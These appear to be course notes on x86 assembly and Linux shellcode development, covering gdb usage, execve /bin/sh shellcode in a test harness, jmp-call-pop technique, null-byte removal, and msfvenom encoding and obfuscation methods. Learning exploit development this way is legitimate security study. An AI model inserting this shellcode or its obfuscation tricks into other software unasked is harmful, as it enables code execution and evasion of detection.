# assembly course

set gdb environment using ~/.gdbinit
```
set disassembly-flavor intel
```
sample program using syscalls

```assembly
global _start

section .text
_start:

        ; find syscall arguments via man 2 [syscall name]

        mov eax, 0x4 ; syscall number taken from /usr/include/i386-linux-gnu/asm/unistd_32.h
        mov ebx, 1 ; stdout, where message goes
        mov ecx, message ; pointer to buffer
        mov edx, mlen ; buffer length
        int 0x80 ; call interrupt


        mov eax, 1
        mov ebx, 1              ; sys_exit syscall - exit status
        int 0x80

section .data

        message: db "Hello World" ; define byte [...]
        mlen     equ $-message
```
compile
```
vagrant@exploit-dev32:~$ nasm -f elf32 -o hello.o hello.asm
vagrant@exploit-dev32:~$ ld -o hello hello.o
vagrant@exploit-dev32:~$ ./hello
Hello World
vagrant@exploit-dev32:~$
```
gdb basic commands
```
# make breakpoint
br _start
# disassembly code
disassemble
# incremental step
stepi
# print registers
info [all-]registers
# examine memory at location...
x/s 0x80490a4
0x80490a4:      "Hello World"
# preview functions
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x08048080  _start
```
moving values vs moving address
```
mov eax,message ; move address stored in message
mov eax,[message] ; dereference address and store actual value in eax
```
define initialized data (byte, word, double word, quasi)
```
db 0x55
db 'a',0x55
dw 'a'
dw 0x1234
dw 'abc'
dd 0x12345678
dd 1.12345e20
dq 1.23451e20 ; double precision
dt 1.234e1033 ; extended precision
```
define uninitialized data
```
buffer: resb 64 ; reserve 64 bytes
wordvar: resw 1 ; reserve a word
```
special tokens
```
$ - eval to current line
$$ - beginning of current section
```
times
```
var: times 12 db 1 ; define bute 1 twelve times
times 12 movsb ; move sb twelve times
```
breakpoint on entry point
```
(gdb) shell readelf -h DataTypes
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00
  Class:                             ELF32
  Data:                              2's complement, little endian
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI Version:                       0
  Type:                              EXEC (Executable file)
  Machine:                           Intel 80386
  Version:                           0x1
  Entry point address:               0x8048080
  Start of program headers:          52 (bytes into file)
  Start of section headers:          240 (bytes into file)
  Flags:                             0x0
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         2
  Size of section headers:           40 (bytes)
  Number of section headers:         7
  Section header string table index: 4
(gdb) br *0x8048080
Breakpoint 3 at 0x8048080
```
examine variable
```
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080490a4  var1
0x080490a5  var2
0x080490a8  var3
0x080490aa  var4
0x080490ae  var5
0x080490b2  var6
0x080490b8  message
0x080490c4  __bss_start
0x080490c4  _edata
0x080490c4  var7
0x08049128  var8
0x08049150  _end
(gdb) x/xb 0x080490b8
0x80490b8:      0x48
(gdb) x/2xb 0x080490a5
0x80490a5:      0xbb    0xcc
```
define hook to execute after seach stop (break)
```
(gdb) define hook-stop
Type commands for definition of "hook-stop".
End with a line saying just "end".
>print/x $eax
>print/x $ebx
>print/x $ecx
>x/8xb &sample
>disa
disable      disassemble
>disassemble $eip,+10
>end
```
display values after step
```
display/x $eax
display/x $ebx
```
shellcodes resources
```
shell-storm.org
exploit-db.com
projectshellcode.com
```
analyzing shellcode
```
(gdb) disassemble
Dump of assembler code for function main:
   0x080483e4 <+0>:     push   ebp
   0x080483e5 <+1>:     mov    ebp,esp
   0x080483e7 <+3>:     push   edi
=> 0x080483e8 <+4>:     and    esp,0xfffffff0
   0x080483eb <+7>:     sub    esp,0x30
   0x080483ee <+10>:    mov    eax,0x804a014
   0x080483f3 <+15>:    mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>:    mov    edx,eax
   0x080483fd <+25>:    mov    eax,0x0
   0x08048402 <+30>:    mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>:    mov    edi,edx
   0x08048408 <+36>:    repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>:    mov    eax,ecx
   0x0804840c <+40>:    not    eax
   0x0804840e <+42>:    lea    edx,[eax-0x1]
   0x08048411 <+45>:    mov    eax,0x8048510
   0x08048416 <+50>:    mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>:    mov    DWORD PTR [esp],eax
   0x0804841d <+57>:    call   0x8048300 <printf@plt>
   0x08048422 <+62>:    mov    DWORD PTR [esp+0x2c],0x804a014
   0x0804842a <+70>:    mov    eax,DWORD PTR [esp+0x2c]
   0x0804842e <+74>:    call   eax
   0x08048430 <+76>:    mov    edi,DWORD PTR [ebp-0x4]
   0x08048433 <+79>:    leave
   0x08048434 <+80>:    ret
End of assembler dump.
(gdb) shell cat shellcode.c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
"\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
(gdb) print /x &code
$1 = 0x804a014
(gdb) x/xw 0x804a014
0x804a014 <code>:       0x6850c031
(gdb) x/23b 0x804a014
0x804a014 <code>:       0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0x804a01c <code+8>:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0x804a024 <code+16>:    0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
(gdb) br *0x0804842e
Breakpoint 2 at 0x804842e
; 0x0804842e <+74>:    call   eax
(gdb) c
Continuing.
Shellcode Length:  23

Breakpoint 2, 0x0804842e in main ()
(gdb) disassemble
Dump of assembler code for function main:
   0x080483e4 <+0>:     push   ebp
   0x080483e5 <+1>:     mov    ebp,esp
   0x080483e7 <+3>:     push   edi
   0x080483e8 <+4>:     and    esp,0xfffffff0
   0x080483eb <+7>:     sub    esp,0x30
   0x080483ee <+10>:    mov    eax,0x804a014
   0x080483f3 <+15>:    mov    DWORD PTR [esp+0x1c],0xffffffff
   0x080483fb <+23>:    mov    edx,eax
   0x080483fd <+25>:    mov    eax,0x0
   0x08048402 <+30>:    mov    ecx,DWORD PTR [esp+0x1c]
   0x08048406 <+34>:    mov    edi,edx
   0x08048408 <+36>:    repnz scas al,BYTE PTR es:[edi]
   0x0804840a <+38>:    mov    eax,ecx
   0x0804840c <+40>:    not    eax
   0x0804840e <+42>:    lea    edx,[eax-0x1]
   0x08048411 <+45>:    mov    eax,0x8048510
   0x08048416 <+50>:    mov    DWORD PTR [esp+0x4],edx
   0x0804841a <+54>:    mov    DWORD PTR [esp],eax
   0x0804841d <+57>:    call   0x8048300 <printf@plt>
   0x08048422 <+62>:    mov    DWORD PTR [esp+0x2c],0x804a014
   0x0804842a <+70>:    mov    eax,DWORD PTR [esp+0x2c]
=> 0x0804842e <+74>:    call   eax
   0x08048430 <+76>:    mov    edi,DWORD PTR [ebp-0x4]
   0x08048433 <+79>:    leave
   0x08048434 <+80>:    ret
End of assembler dump.
(gdb) print /x $eax
$2 = 0x804a014
(gdb) x/23b 0x804a014
0x804a014 <code>:       0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0x804a01c <code+8>:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0x804a024 <code+16>:    0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80
(gdb)
(gdb) br *0x0804a014
Breakpoint 3 at 0x804a014
(gdb) c
Continuing.

Breakpoint 3, 0x0804a014 in code ()
(gdb) disassemble
Dump of assembler code for function code:
=> 0x0804a014 <+0>:     xor    eax,eax
   0x0804a016 <+2>:     push   eax
   0x0804a017 <+3>:     push   0x68732f2f
   0x0804a01c <+8>:     push   0x6e69622f
   0x0804a021 <+13>:    mov    ebx,esp
   0x0804a023 <+15>:    push   eax
   0x0804a024 <+16>:    push   ebx
   0x0804a025 <+17>:    mov    ecx,esp
   0x0804a027 <+19>:    mov    al,0xb
   0x0804a029 <+21>:    int    0x80
   0x0804a02b <+23>:    add    BYTE PTR [eax],al
End of assembler dump.

```
Dump executable
```
vagrant@exploit-dev32:~/slae-code/Shellcode/exit$ objdump -d exit -M intel

exit:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       b8 01 00 00 00          mov    eax,0x1
 8048065:       bb 01 00 00 00          mov    ebx,0x1
 804806a:       cd 80                   int    0x80

```
getting rid of nulls inside shellcode - nulls are bad
```
xor eax,eax
mov al,1
```
objdump to shellcode
```
objdump -d ./PROGRAM|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc0\xb0\x01\x31\xdb\xb3\x01\xcd\x80"
```
execve - jmp-call-pop
```
global _start

section .text
_start:

  jmp short call_shellcode

shellcode:
  pop esi

  xor ebx,ebx
  mov byte [esi+9], bl ; we can't use nulls in ours shellcode, so we pop ABBBB and then replace it with 0 (null term) during execution
  mov dword [esi+10], esi
  mov dword [esi+14], ebx

  lea ebx, [esi] ; string pointing to /bin/bash
  lea ecx, [esi+10] ; address of /bin/bash
  lea edx, [esi+14]

  xor eax,eax
  mov al,0xb
  int 0x80

call_shellcode:
  call shellcode
  message db "/bin/bashABBBBCCCC" ; we define executable to start, then arguments and environment
```
encode payload using msfvenom
```
echo -ne "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" | msfvenom -e x86/jmp_call_additive -a x86 --platform linux -f c
```
ways to obsfucate shellcode
```
xor encoder
use msfvenom encoders
not encoder
insertion encoder (put 0xAA after each shellcode byte)
```

